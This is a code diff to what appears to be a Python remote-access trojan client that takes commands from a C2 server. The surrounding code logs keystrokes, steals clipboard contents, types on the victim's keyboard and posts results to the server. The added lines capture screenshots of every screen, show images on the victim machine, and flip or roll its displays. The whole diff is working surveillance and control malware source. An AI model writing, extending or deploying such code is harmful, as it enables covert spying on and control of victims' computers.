@@ -8,6 +8,8 @@ import platform, socket, time
 from subprocess import PIPE, STDOUT, run
 from pyperclip import paste, PyperclipWindowsException, PyperclipException
 from pynput.keyboard import Listener, Controller
+from PIL import Image, ImageGrab
+from rotatescreen import get_displays
 from requests import exceptions, get, post, put
 from crypt import cipher
 from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
@@ -25,9 +27,10 @@ def post_to_server(msg, response_path=RESPONSE_PATH, response_key=RESPONSE_KEY):
     
 def get_filename(input_string, replace=True):
     """This function that splits a str & return the 3rd item reformatted ;)"""
-    try:
-        return " ".join(input_string.split()[2:]).replace("\\", "/")
-    except IndexError:
+    output_str = " ".join(input_string.split()[2:]).replace("\\", "/")
+    if output_str:
+        return output_str
+    else:
         post_to_server(f"You must enter a argument after {input_string}.\n")
 
 def on_press(key_press):
@@ -45,6 +48,7 @@ encrypted_client = cipher.encrypt(client.encode()).decode() # encoder
 
 delay = DELAY
 clip_count = 0
+shot_count = 0
 listener = None
 key_log = []
 
@@ -198,7 +202,7 @@ while True:
             post_to_server("Key logging is not enabled on the client.\n")
 
     # The "client type TEXT" command will type some text on the client's keyboard
-    elif cmd.startswith(C2Commands.CLS_TYPE.value):
+    elif cmd.startswith(C2Commands.CLS_TYPE.value): # client type
         keyboard = None
         try:
             # Split out the text to type and join it back together as a string, then type it
@@ -210,6 +214,41 @@ while True:
             post_to_server(f"You must enter some text to type on the client.\n")
         except keyboard.InvalidCharacterException:
             post_to_server(f"A non-typeable character was encountered.\n")
+
+    elif cmd == C2Commands.CLS_SCRS.value: # client screenshot
+        shot_count += 1
+        screenshot = ImageGrab.grab(all_screens=True) # True only working in windows
+        screenshot.save(f"screenshot_{shot_count}.png")
+        post_to_server(f"screenshot_{shot_count}.png has been saved.\n")
+
+    elif cmd.startswith(C2Commands.CLS_DSP.value): # client display
+        filepath = get_filename(cmd)
+        if filepath is None:
+            continue
+        try:
+            image = Image.open(filepath)
+            image.show()
+            post_to_server(f"{filepath} is now displaying on the client.\n")
+        except OSError:
+            post_to_server(f"Unable to display {filepath} on {client}.\n")
+
+    elif cmd == C2Commands.CLS_FLPS.value or cmd == C2Commands.CLS_FLP.value and platform.system() == "Windows": # client flip screen
+        screens = get_displays()
+        for screen in screens:
+            start_pos = screen.current_orientation
+            screen.rotate_to(abs((start_pos - 180) % 360))
+
+    elif cmd == C2Commands.CLS_RLLS.value or cmd == C2Commands.CLS_RLL.value and platform.system() == "Windows": # client roll screen
+        screens = get_displays()
+        for screen in screens:
+            start_pos = screen.current_orientation
+
+            # Range end must be 5, 9, 13, 17, ...  in order for the screen to end up at the starting position
+            for i in range(1, 9):
+                pos = abs((start_pos - i * 90) % 360)
+                screen.rotate_to(pos)
+                # Configure a delay between 90 deg. shifts
+                time.sleep(1.5)
   
     print(response.status_code)
     #print(f"Response Object: {response.request.headers}\n\tHeader: {response.headers}\n\tReason: {response.reason}\n\tStatus: {response.status_code}")
